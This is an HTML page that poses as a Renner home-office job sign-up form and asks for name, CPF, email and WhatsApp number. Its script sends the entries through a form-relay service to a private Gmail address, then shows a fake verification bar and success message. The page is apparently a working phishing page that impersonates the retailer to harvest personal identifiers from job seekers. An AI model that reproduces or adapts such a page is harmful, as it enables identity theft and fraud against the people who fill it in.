<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cadastro de Vagas | Renner</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      color: #333;
    }

    header {
      background-color: #b80000;
      color: white;
      padding: 1.2rem;
      text-align: center;
      font-size: 1.4rem;
    }

    main {
      padding: 2rem;
      max-width: 400px;
      margin: auto;
      background-color: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      margin-top: 3rem;
      border-radius: 8px;
    }

    h2 {
      color: #b80000;
      text-align: center;
    }

    label {
      display: block;
      margin-top: 1.2rem;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 0.7rem;
      margin-top: 0.3rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      margin-top: 1.5rem;
      width: 100%;
      background-color: #b80000;
      color: white;
      padding: 0.9rem;
      border: none;
      border-radius: 4px;
      font-size: 1rem;
      cursor: pointer;
    }

    button:hover {
      background-color: #990000;
    }

    .loader-container, .success-message {
      display: none;
      text-align: center;
      margin-top: 2rem;
    }

    .loader {
      width: 100%;
      height: 20px;
      background: #eee;
      border-radius: 10px;
      overflow: hidden;
      margin-top: 20px;
    }

    .bar {
      width: 0;
      height: 100%;
      background-color: #b80000;
      animation: loading 3s forwards;
    }

    @keyframes loading {
      to {
        width: 100%;
      }
    }

    .footer {
      text-align: center;
      font-size: 0.9rem;
      color: #aaa;
      margin-top: 2rem;
    }
  </style>
</head>
<body>
  <header>
    Vagas Renner - Home Office
  </header>

  <main>
    <h2>Cadastre-se agora</h2>
    <form id="formulario">
      <label for="nome">Nome completo</label>
      <input type="text" id="nome" name="Nome" required />

      <label for="cpf">CPF</label>
      <input type="text" id="cpf" name="CPF" placeholder="000.000.000-00" required />

      <label for="email">E-mail</label>
      <input type="email" id="email" name="Email" required />

      <label for="whatsapp">WhatsApp</label>
      <input type="text" id="whatsapp" name="WhatsApp" placeholder="(00) 00000-0000" required />

      <button type="submit">Cadastrar</button>
    </form>

    <div class="loader-container" id="loader">
      <h3>Verificando seus dados...</h3>
      <div class="loader"><div class="bar"></div></div>
    </div>

    <div class="success-message" id="sucesso">
      <h3>✅ Cadastro recebido com sucesso!</h3>
      <p>Nossa equipe entrará em contato pelo WhatsApp nos próximos dias.</p>
    </div>

    <div class="footer">
      © Renner 2025 - Todos os direitos reservados
    </div>
  </main>

  <script>
    document.getElementById('formulario').addEventListener('submit', function(e) {
      e.preventDefault();

      const data = new FormData(this);
      const action = "https://formsubmit.co/natanaelverissimo34@gmail.com";

      this.style.display = "none";
      document.getElementById('loader').style.display = "block";

      fetch(action, {
        method: "POST",
        body: data
      });

      setTimeout(() => {
        document.getElementById('loader').style.display = "none";
        document.getElementById('sucesso').style.display = "block";
      }, 3200);
    });
  </script>
</body>
</html>
